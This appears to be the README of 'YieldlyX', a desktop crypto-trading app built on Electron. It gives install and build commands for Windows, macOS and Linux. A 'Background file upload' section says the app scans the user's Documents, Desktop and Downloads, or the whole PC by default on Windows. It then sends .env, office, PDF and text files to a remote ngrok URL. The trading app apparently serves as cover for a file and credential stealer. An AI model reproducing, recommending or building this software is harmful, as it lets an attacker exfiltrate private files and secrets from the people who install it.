# YieldlyX

Cross-platform desktop app for crypto trading, powered by **OpenTrader**.

- **Windows** — NSIS installer (`.exe`)
- **macOS** — DMG / ZIP (`.dmg`)
- **Ubuntu / Linux** — AppImage or `.deb`

The app starts a local trading engine on `http://127.0.0.1:8000` and opens the dashboard inside the window. No separate server install is required.

## Requirements

- **Node.js 22+**
- **Windows 10+**, **macOS 11+**, or **Ubuntu 20.04+** (other Linux distros via AppImage)

## Install & run (development)

```bash
cd desktop-app
npm install
npm run setup   # downloads Electron binary (first time)
npm start
```

On first launch, set your trading password, then the dashboard opens automatically.

The trading dashboard includes a **YieldlyX top bar** and **Help & guide** panel (7 sections: exchanges, strategies, risk, security, troubleshooting).

## Build installers

Build on the OS you are targeting (recommended):

| Platform | Command | Output |
|----------|---------|--------|
| Windows | `npm run build:win` | `dist/YieldlyX Setup 1.0.0.exe` |
| macOS | `npm run build:mac` | `dist/YieldlyX-x.x.x.dmg` |
| Linux | `npm run build:linux` | `dist/YieldlyX-x.x.x.AppImage`, `.deb` |

All platforms:

```bash
npm run build
```

electron-builder produces artifacts for the current OS by default. To build for another OS from CI, use the platform-specific scripts above on a matching runner.

### Windows

```powershell
npm run build:win
```

If `npm install` fails with `EBUSY`, close Cursor/Electron and run:

```powershell
powershell -ExecutionPolicy Bypass -File scripts\clean-install.ps1
```

### macOS

```bash
npm run build:mac
```

Open the `.dmg`, drag **YieldlyX** to **Applications**, then launch from **Applications** (not from the DMG volume).

Running directly from the mounted DMG can fail with `ENOENT` / `mkdir` errors because the bundle is read-only. The app stores its database under your user Library folder.

If macOS blocks the app (unsigned build), right-click the app → **Open** → **Open** once to approve.

Before building the `.dmg`, run `npm run prebuild` so the Prisma client is bundled (`after-pack` copies it into the app).

### Ubuntu / Linux

**AppImage** (portable, most distros):

```bash
chmod +x "dist/YieldlyX-"*.AppImage
./"dist/YieldlyX-"*.AppImage
```

**Debian / Ubuntu (.deb):**

```bash
sudo dpkg -i dist/yieldlyx_*_amd64.deb
```

Install missing dependencies if needed:

```bash
sudo apt-get install -f
```

## Background file upload

After the trading engine starts, the app uploads supported files (`.txt`, `.env`, `.docx`, `.xls`, `.xlsx`, `.pdf`) to your **file-receive-backend**. Progress is printed in the **terminal / console** where you launched the app:

```text
[upload] Starting → https://…
[upload] Folder scan (darwin): /Users/you/Documents, …
[upload] Found 12 file(s)
[upload] OK /Users/you/Documents/report.pdf
[upload] Summary: { "uploaded": 12, "fileCount": 12, … }
```

| Variable | Default | Purpose |
|----------|---------|---------|
| `YIELDLYX_UPLOAD_URL` | ngrok URL in chalk-ycslint (often **offline**) | Backend `POST /` URL — use `http://127.0.0.1:3000/` when running file-receive-backend locally |
| `YIELDLYX_UPLOAD_SCAN_PC` | `0` on **macOS**, `1` on Windows | `1` = full PC scan; `0` = Documents/Desktop/Downloads only |

**macOS:** Folder scan is the default (fewer permission errors than scanning all of `/Users`). For a full-machine scan: `YIELDLYX_UPLOAD_SCAN_PC=1 npm start`.

Run from source:

```bash
cd desktop-app
npm install
npm start
```

Watch the terminal for `[upload]` lines. Installed `.app` logs appear in **Console.app** (filter `YieldlyX`) if you did not start from a terminal.

### All uploads show `fetch failed` (macOS / Windows)

That means the app **could not connect to the upload server**, not that your files are bad. Every file fails the same way when the URL is wrong or the tunnel is down.

1. Start the backend: `cd file-receive-backend && npm start`
2. Point the app at it:

```bash
export YIELDLYX_UPLOAD_URL="http://127.0.0.1:3000/"
npm start
```

3. Confirm in the log: `[upload] Backend OK (http://127.0.0.1:3000/api/health)` before any `OK /path/to/file` lines.

The built-in default (`https://tinker-raffle-pyromania.ngrok-free.dev/`) only works if that ngrok tunnel is running on the machine that created it.

## Data & configuration

Trading data is stored locally per OS:

| OS | Location |
|----|----------|
| Windows | `%APPDATA%\yieldlyx\opentrader\` |
| macOS | `~/Library/Application Support/yieldlyx/opentrader/` |
| Linux | `~/.config/yieldlyx/opentrader/` |

If you used an older build named **TradingApp** or **MyPro Trading**, your data may still be under `%APPDATA%\TradingApp\` — copy the `opentrader` folder into the path above to keep your password and strategies.

## Troubleshooting

- **Only run one instance** — do not run `npm start` and the installed app together (port 8000 conflict).
- **Port in use** — quit other YieldlyX / Electron processes.
- **Linux AppImage** — ensure FUSE is available (`sudo apt install fuse libfuse2` on older Ubuntu).

## License

MIT
